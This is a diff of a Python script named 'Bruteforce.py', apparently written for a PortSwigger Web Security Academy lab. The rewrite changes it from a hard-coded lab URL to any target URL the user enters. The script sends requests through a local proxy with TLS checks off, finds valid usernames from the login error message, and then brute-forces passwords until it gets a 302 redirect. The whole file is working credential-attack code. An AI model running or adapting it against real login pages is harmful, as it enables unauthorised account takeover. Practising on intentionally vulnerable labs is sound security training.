@@ -1,29 +1,52 @@
 import requests
-#URL del sitio web
-url = "https://0aa600040364e3f985f20e50003d005e.web-security-academy.net/login"
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+def banner():
+	return """##### Bruteforce.py #####"""
+	
+print(banner())
+
+proxies={
+	"http": "http://127.0.0.1:8080",
+	"https": "http://127.0.0.1:8080"
+}
+
+url = input("Enter the target Url : ")
+
 
 with open("usuarios_noborrar.txt", "r") as users_file:
-  usernames = [line.strip() for line in users_file]
+  usernames = users_file.read().splitlines()
 
+  	
 with open("passwords_db.txt", "r") as passwords_file:
-  passwords = [line.strip() for line in passwords_file]
+  passwords = passwords_file.read().splitlines()
 
-
-#Ataque de fuerza bruta
 for username in  usernames:
-  for password in passwords:
-    #Datos formulario
-    data = {"username": username, "password": password}
+	print(f"Probando username: {username}")
+	data = {"username": username, "password": "IncorrectPass"}
+	response = requests.post(url, data=data, proxies=proxies, verify=False)
+	if response.status_code == 200 and "Incorrect password" in response.text:
+		print(f"Username valido encontrado: {username}")
+		
+		for password in passwords:
+			data={"username": username, "password": password}
+			response2 = requests.post(url, data=data, proxies=proxies, verify=False, allow_redirects=False)
+			if response2.status_code == 302:
+				print(f"Inicio exitoso! Username: {username}, Password: {password}")
+				correctPass = password
+				correctUser = username
+				break
+			else:
+				print(f"Password incorrecta probada: {password}")
+		break
+	else: 
+		print(f"Username invalido: {username}")
 
-    #Envio de solicitud POST
-    response = requests.post(url, data=data)
-
-    #Verificar respuestas
-    if "Incorrect password" in response.text:
-      print(f"Usuario valido encontrado: {username}")
-      break #No prueba mas contrasenias para este usuario
-    elif "Welcome" in response.text:
-      print(f"Credenciales validas: {username}:{password}")
-      exit()
+print(f"Bruteforce finished")
+		
+			
+    	
 
 
